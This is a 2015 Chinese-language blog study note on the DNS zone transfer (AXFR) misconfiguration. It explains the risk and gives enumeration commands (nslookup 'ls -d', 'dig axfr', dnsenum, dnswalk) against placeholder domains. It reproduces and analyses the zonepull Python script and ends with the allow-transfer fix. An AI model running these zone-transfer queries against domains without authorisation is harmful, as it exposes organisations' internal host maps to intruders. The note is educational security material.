---
title:  "DNS域传送漏洞学习总结"
date:  2015-09-02 13:30:00
categories: studying
layout: default
excerpt: "学习：最基本的漏洞利用命令及对应脚本分析"
---

# 0x01 前言 #

本文是关于DNS域传送漏洞的学习与总结。

在[《安全参考》][1]第一期中有：区域传送操作指的是一台后备服务器使用来自主服务器的数据刷新自己的 zone 数据库。这为运行中的 DNS 服务提供了一定的冗余度,其目的是为了防止主域名服务器因意外故障变得不可用时影响到全局。一般来说,DNS区域传送操作只在网络里真的有后备域名 DNS 服务器时才有必要执行,但许多 DNS 服务器却被错误地配置成**只要有人发出请求**,就会向对方提供一个 zone 数据库的**拷贝**。如果所提供的信息只是与连到因特网上且具备有效主机名的系统相关,那么这种错误配置不一定是坏事,尽管这使得攻击者发现潜在目标要容易得多。真正的问题发生在一个单位没有使用公用/私用 DNS 机制来分割外部公用 DNS 信息和内部私用 DNS 信息的时候,此时内部主机名和 IP 地址都暴露给了攻击者。把内部 IP 地址信息提供给因特网上不受信任的用户,就像是把一个单位的内部网络完整蓝图或导航图奉送给了别人。对系统管理员来说,允许不受信任的因特网用户执行 DNS 区域传送(`zone transfer`)操作是后果最为严重的错误配置之一。

同时，在[WooYun WiKi][2]中也说道，利用DNS域传送漏洞可以有效地收集相关企业的子域名，收集信息也是渗透过程中很关键的一步。


# 0x02 攻击方法 #

## Windows下使用nslookup ##

1. 先设置查找类型为NS，查找出对应主机域的域名服务器。（或直接键入nslookup进入交互模式，再通过`set type=ns`进行设置）

    `C:\>nslookup -qa=ns test.com`

    会返回类似结果：

           Server:  bogon
           Address:  172.16.162.2           

           Non-authoritative answer:
           test.com        nameserver = ns66.worldnic.com
           test.com        nameserver = ns65.worldnic.com


2. 使用nslookup命令进入交互模式，更改默认服务器为刚才查询的域名服务器

    `> server=ns66.worldnic.com`

3. 列出服务器上所有的DNS记录

    `> ls -d test.com`

4. nslookup命令参考：

    * [《nslookup通往DNS的桥梁》-linux命令五分钟系列之三十三][3]
    * nslookup进入交互模式后查看帮助：`>help`

## Kali下使用dig, dnsenum, dnswalk ##

* 使用`dig`命令进行全量传输[AXFR][4]（从域名服务器从主域名服务器上请求zone文件）
        
        dig @dnsserver name querytype
        dig @192.168.5.6 test.com axfr

* 使用`dnsenum`获取测试对象全部的 DNS 解析记录信息

        ./dnsenum.pl –enum test.com

* 使用`dnswalk`获取测试对象全部的 DNS 解析记录信息，注意域名后有一个点

        ./dnswalk test.com.

* 相关命令参考：

    * [《安全参考》第一期][5]
    * [DNS域传送信息泄露][6]
    * [《dig挖出DNS的秘密》-linux命令五分钟系列之三十四][7]

## 0x03 攻击Python脚本分析 ##

一看Github上有，就拿来分析一下吧，[kaizoku/zonepull][8]

    #!/usr/bin/env python
    ### Zonepuller
    ## Attempts to get a domain transfer from the nameservers for the given domain
    ## Requires dnspython http://www.dnspython.org/    

    import sys
    import socket
    import optparse
    try:
        from dns import resolver, query, exception
    except ImportError:
        print "This script requires dnspython"
        print "http://www.dnspython.org/"
        sys.exit(1)    
    
    

    class Transferrer(object):
        def __init__(self, domain):
            self.domain = domain
            ## build list of nameservers
            nss = resolver.query(domain, 'NS')
            self.nameservers = [ str(ns) for ns in nss ]    
    

        def transfer(self):
            for ns in self.nameservers:
                print >> sys.stderr, "Querying %s" % (ns,)
                print >> sys.stderr, "-" * 50
                z = self.query(ns)
                print z
                print >> sys.stderr, "%s\n" % ("-" * 50,)    
    

        def query(self, ns):
            nsaddr = self.resolve_a(ns)
            try:
                z = self.pull_zone(nsaddr)
            except (exception.FormError, socket.error, EOFError):
                print >> sys.stderr, "AXFR failed\n"
                return None
            else:
                return z    
    

        def resolve_a(self, name):
            """Pulls down an A record for a name"""
            nsres = resolver.query(name, 'A')
            return str(nsres[0])    
    

        def pull_zone(self, nameserver):
            """Sends the domain transfer request"""
            q = query.xfr(nameserver, self.domain, relativize=False, timeout=2)
            zone = ""   ## janky, but this library returns
            for m in q: ## an empty generator on timeout
                zone += str(m)
            if not zone:
                raise EOFError
            return zone    
    

    def main():
        parser = optparse.OptionParser(usage="%prog <domain>", version="%prog 0.1")
        options, args = parser.parse_args()
        if not args:
            parser.error("Must include at least one domain to transfer")    

        for dom in args:
            t = Transferrer(dom)
            t.transfer()

### 分析：###

* 程序先尝试导入dns，没有安装dnspython则退出
* 定义Transferrer()类来完成主要的域传送检测，先使用`resolver.query(domain, 'NS')`方法查询对应域名的NS记录，并将其作为域名服务器查询其A记录，最后使用`query.xfr(nameserver, self.domain, relativize=False, timeout=2)`尝试进行域传送
* main()函数主要对命令行传入的域名进行单线程串行检测是否存在DNS域传送

### Tips：###

* `print >> sys.stderr, "Message"`可将信息重定向输出到标准错误输出当中
*  `parser.error("Message")`可用于选项解析错误提示

## 0x04 防御方法 ##

在相应的zone、options中添加allow-transfer限制，具体见[DNS 域传送漏洞][9]。这里还存在的**问题**是：未对DNS服务和DNS服务器深入了解，攻击也没有重现，还有待深入学习，而且DNS的问题也不止这些，[推荐看看][10]


[1]:http://www.hackcto.com/post/2013-01-15/40047740289
[2]:http://wiki.wooyun.org/information:domain
[3]:http://roclinux.cn/?p=2441
[4]:http://www.cnblogs.com/cobbliu/archive/2013/03/24/2979521.html
[5]:http://www.hackcto.com/post/2013-01-15/40047740289
[6]:http://drops.wooyun.org/papers/64
[7]:http://roclinux.cn/?p=2449
[8]:https://github.com/kaizoku/zonepull/blob/master/zonepull/zonepull.py
[9]:http://wiki.wooyun.org/doku.php?id=server:zone-transfer
[10]:http://www.cnblogs.com/cobbliu/archive/2013/03/24/2979521.html